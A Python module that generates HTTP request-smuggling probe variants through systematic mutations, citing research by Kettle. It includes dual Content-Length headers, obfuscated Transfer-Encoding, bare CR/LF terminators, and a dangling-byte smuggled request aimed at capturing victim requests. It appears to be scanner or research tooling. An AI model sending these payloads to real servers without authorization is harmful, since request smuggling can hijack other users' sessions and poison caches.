"""
Vector Permutation Engine:
Applies systematic mutations and permutations to candidate triggers
based on techniques discovered in the HTTP Terminator research paper.
"""

import random
import re
from typing import Any, Dict, List, Optional, Tuple

from database import Database


class VectorPermutator:
    """
    Applies protocol transformations (early-response paths, header casing,
    tabs, dual-CL, multipart/byteranges, dangling bytes, and alternative line/frame terminators)
    to multiply probe novelty. Supports database-backed dynamic permutations and trigger combination.
    """

    def __init__(self, db: Optional[Database] = None):
        self.db = db

    def permute_probe(self, base_probe: Dict[str, Any], max_variants: int = 5) -> List[Dict[str, Any]]:
        raw_req = base_probe.get("raw_request", "")
        if not raw_req:
            return []

        parent_id = base_probe.get("probe_id")
        variants: List[Dict[str, Any]] = []

        # Escalate permutation depth if probe has reached validation attempt threshold
        effective_max = max_variants
        if self.db and parent_id:
            try:
                attempts = self.db.get_probe_evaluation_count(parent_id)
                if attempts >= 3:
                    effective_max = max(max_variants, 8)
            except Exception:
                pass

        mutators = [
            self._mutate_path_nul,
            self._mutate_path_asterisk_gadget,
            self._mutate_header_tab_spacing,
            self._mutate_dual_matching_cl,
            self._mutate_header_casing_underscore,
            self._mutate_dangling_byte,
            self._mutate_multipart_byteranges,
            self._mutate_line_terminator_bare_lf,
            self._mutate_line_terminator_bare_cr,
            self._mutate_line_terminator_double_cr,
            self._mutate_obs_fold_terminator,
            self._mutate_http10_te_gzip,
            self._mutate_intermediary_terminator_headers,
        ]

        # Pick mutators up to effective_max
        selected_mutators = random.sample(mutators, min(len(mutators), effective_max))
        seen_requests = {raw_req}

        for mutator in selected_mutators:
            mutated_req, mutation_name = mutator(raw_req)
            if mutated_req and mutated_req not in seen_requests:
                seen_requests.add(mutated_req)
                is_clean_val = (
                    True
                    if "clean" in mutation_name
                    else (False if "dirty" in mutation_name else base_probe.get("is_clean", False))
                )
                variant = {
                    "fragment_id": base_probe.get("fragment_id"),
                    "rationale": f"{base_probe.get('rationale', '')} [Permutation: {mutation_name}]",
                    "raw_request": mutated_req,
                    "is_clean": is_clean_val,
                    "source_type": "permuted",
                    "parent_probe_id": parent_id,
                }
                if self.db:
                    p_id = self.db.save_probe(
                        fragment_id=variant["fragment_id"],
                        rationale=variant["rationale"],
                        raw_request=variant["raw_request"],
                        is_clean=variant["is_clean"],
                        source_type="permuted",
                        parent_probe_id=parent_id,
                    )
                    variant["probe_id"] = p_id
                variants.append(variant)

        # Apply any dynamic database-backed permutations (autonomous feedback loop)
        if self.db:
            try:
                dyn_perms = self.db.get_dynamic_permutations()
                for dp in dyn_perms:
                    pat = dp.get("match_pattern", "")
                    rep = dp.get("replacement_text", "")
                    m_name = dp.get("mutation_name", "dynamic_db_mutation")
                    if pat and pat in raw_req:
                        mutated_req = raw_req.replace(pat, rep, 1)
                        if mutated_req not in seen_requests:
                            seen_requests.add(mutated_req)
                            variant = {
                                "fragment_id": base_probe.get("fragment_id"),
                                "rationale": f"{base_probe.get('rationale', '')} [DB-Permutation: {m_name}]",
                                "raw_request": mutated_req,
                                "is_clean": bool(dp.get("is_clean", False)),
                                "source_type": "permuted",
                                "parent_probe_id": parent_id,
                            }
                            p_id = self.db.save_probe(
                                fragment_id=variant["fragment_id"],
                                rationale=variant["rationale"],
                                raw_request=variant["raw_request"],
                                is_clean=variant["is_clean"],
                                source_type="permuted",
                                parent_probe_id=parent_id,
                            )
                            variant["probe_id"] = p_id
                            variants.append(variant)
            except Exception:
                pass

        return variants

    def combine_triggers(self, probe_a: Dict[str, Any], probe_b: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Combines headers from two distinct candidate triggers into a composite trigger,
        implementing the HTTP Terminator escalating combination phase.
        """
        req_a = probe_a.get("raw_request", "")
        req_b = probe_b.get("raw_request", "")
        if "\r\n\r\n" not in req_a or "\r\n\r\n" not in req_b:
            return None

        head_a, body_a = req_a.split("\r\n\r\n", 1)
        head_b, _ = req_b.split("\r\n\r\n", 1)
        lines_a = head_a.split("\r\n")
        lines_b = head_b.split("\r\n")[1:]  # skip request line of B

        existing_lower = {l.lower() for l in lines_a}
        added = 0
        for line in lines_b:
            if line and not line.lower().startswith("host:") and line.lower() not in existing_lower:
                lines_a.append(line)
                added += 1

        if added == 0:
            return None

        combined_raw = "\r\n".join(lines_a) + "\r\n\r\n" + body_a
        combined = {
            "fragment_id": probe_a.get("fragment_id"),
            "rationale": f"[Combined Trigger] {probe_a.get('rationale', '')[:40]} + {probe_b.get('rationale', '')[:40]}",
            "raw_request": combined_raw,
            "is_clean": bool(probe_a.get("is_clean", False) and probe_b.get("is_clean", False)),
            "source_type": "permuted",
            "parent_probe_id": probe_a.get("probe_id"),
        }
        if self.db:
            combined["probe_id"] = self.db.save_probe(
                fragment_id=combined["fragment_id"],
                rationale=combined["rationale"],
                raw_request=combined["raw_request"],
                is_clean=combined["is_clean"],
                source_type="permuted",
                parent_probe_id=combined["parent_probe_id"],
            )
        return combined

    def _mutate_path_nul(self, req: str) -> Tuple[str, str]:
        """Replaces root path with /nul to trigger early 400/404 responses (0.CL deadlock resolution)."""
        pattern = re.compile(r"^(GET|POST|HEAD|PUT|DELETE|OPTIONS)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
        if pattern.search(req):
            mutated = pattern.sub(r"\1 /nul \2", req, count=1)
            return mutated, "path_nul_early_response"
        return req, ""

    def _mutate_path_asterisk_gadget(self, req: str) -> Tuple[str, str]:
        """Mutates to OPTIONS *?xyz gadget that triggers Apache early-response behavior."""
        lines = req.split("\r\n")
        if lines:
            first_line = lines[0]
            if "HTTP/" in first_line:
                lines[0] = "OPTIONS *?xyz HTTP/1.1"
                return "\r\n".join(lines), "apache_options_asterisk_gadget"
        return req, ""

    def _mutate_header_tab_spacing(self, req: str) -> Tuple[str, str]:
        """Injects colon-tab spacing as discovered in 'Expect :\\t100-continue'."""
        if "\r\nHost:" in req:
            return req.replace("\r\nHost:", "\r\nHost :\t"), "header_colon_tab_spacing"
        return req, ""

    def _mutate_dual_matching_cl(self, req: str) -> Tuple[str, str]:
        """
        Duplicates Content-Length header with identical values.
        Triggered the breakthrough NetScaler / SSO / Bank vulnerabilities in Kettle's paper.
        """
        cl_match = re.search(r"\r\n(Content-Length:\s*(\d+))", req, re.IGNORECASE)
        if cl_match:
            full_header = cl_match.group(1)
            # Duplicate header
            mutated = req.replace(f"\r\n{full_header}", f"\r\n{full_header}\r\n{full_header}", 1)
            return mutated, "clean_dual_matching_content_length"
        if "\r\n\r\n" in req:
            dual_insert = "Content-Length: 1\r\nContent-Length: 1\r\n"
            mutated = req.replace("\r\n\r\n", f"\r\n{dual_insert}\r\n", 1)
            return mutated, "clean_dual_matching_content_length"
        return req, ""

    def _mutate_header_casing_underscore(self, req: str) -> Tuple[str, str]:
        """Transforms Transfer-Encoding into Transfer_Encoding or POsT casing."""
        mutated = req
        if "Transfer-Encoding:" in mutated:
            mutated = mutated.replace("Transfer-Encoding:", "Transfer_Encoding:")
            return mutated, "header_underscore_transfer_encoding"
        if "POST /" in mutated:
            mutated = mutated.replace("POST /", "POsT /")
            return mutated, "method_mixed_case_post"
        return req, ""

    def _mutate_dangling_byte(self, req: str) -> Tuple[str, str]:
        """
        Applies Kettle's dangling byte technique to solve the stacked-response race condition.
        Missing 1 byte delays back-end response until victim request arrives.
        """
        if "$PAYLOAD" in req:
            # Inject a smuggled request with dangling byte: Content-Length: 1 with empty body
            dangling_marker = (
                "POST /dangling_smuggled HTTP/1.1\r\n"
                "Host: target.local\r\n"
                "Content-Length: 1\r\n\r\n"
            )
            return req.replace("$PAYLOAD", dangling_marker), "dangling_byte_stacked_response_bypass"
        return req, ""

    def _mutate_multipart_byteranges(self, req: str) -> Tuple[str, str]:
        """Injects Content-Type: multipart/byteranges (responsible for 200+ vulnerable bank targets)."""
        if "\r\n\r\n" in req and "multipart/byteranges" not in req:
            header_insert = "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
            mutated = req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1)
            return mutated, "multipart_byteranges_shared_parser_trigger"
        return req, ""

    def _mutate_line_terminator_bare_lf(self, req: str) -> Tuple[str, str]:
        """Replaces a header line's CRLF with a bare LF terminator (RFC 9112 Section 2.2)."""
        if "\r\n\r\n" in req:
            head, body = req.split("\r\n\r\n", 1)
            lines = head.split("\r\n")
            if len(lines) >= 2:
                # Join last two header lines with bare LF instead of CRLF
                mutated_head = "\r\n".join(lines[:-1]) + "\n" + lines[-1]
                return mutated_head + "\r\n\r\n" + body, "dirty_bare_lf_line_terminator"
        return req, ""

    def _mutate_line_terminator_bare_cr(self, req: str) -> Tuple[str, str]:
        """Injects a bare CR (0x0D) delimiter before a secondary header (RFC 9112 Section 2.2)."""
        if "\r\n\r\n" in req:
            mutated = req.replace("\r\n\r\n", "\rX-Terminator-CR: 1\r\n\r\n", 1)
            return mutated, "dirty_bare_cr_line_terminator"
        return req, ""

    def _mutate_line_terminator_double_cr(self, req: str) -> Tuple[str, str]:
        """Uses CR CR LF (\\r\\r\\n) as a header line terminator (RFC 9112 Section 2.2)."""
        if "\r\nHost:" in req:
            return req.replace("\r\nHost:", "\r\r\nHost:", 1), "dirty_double_cr_line_terminator"
        return req, ""

    def _mutate_obs_fold_terminator(self, req: str) -> Tuple[str, str]:
        """Applies RFC 9112 Section 5.2 obsolete line folding (CRLF + SP/HTAB) across header lines."""
        if "\r\n\r\n" in req:
            fold_insert = "X-Fold-Header: first-part\r\n \tsecond-part\r\n"
            return req.replace("\r\n\r\n", f"\r\n{fold_insert}\r\n", 1), "dirty_obs_fold_terminator"
        return req, ""

    def _mutate_http10_te_gzip(self, req: str) -> Tuple[str, str]:
        """Applies HTTP/1.0 + Transfer-Encoding: gzip (RFC 9112 Section 6.1 case study from Kettle's paper)."""
        if "HTTP/1.1" in req and "\r\n\r\n" in req:
            mutated = req.replace("HTTP/1.1", "HTTP/1.0", 1)
            if "Transfer-Encoding:" not in mutated:
                mutated = mutated.replace("\r\n\r\n", "\r\nTransfer-Encoding: gzip\r\n\r\n", 1)
            return mutated, "http10_transfer_encoding_gzip"
        return req, ""

    def _mutate_intermediary_terminator_headers(self, req: str) -> Tuple[str, str]:
        """Injects intermediary/gateway terminator headers (Early-Data: 1, Max-Forwards: 0)."""
        if "\r\n\r\n" in req and "Early-Data:" not in req and "Max-Forwards:" not in req:
            header_insert = "Early-Data: 1\r\nMax-Forwards: 0\r\n"
            return req.replace("\r\n\r\n", f"\r\n{header_insert}\r\n", 1), "intermediary_early_data_max_forwards"
        return req, ""

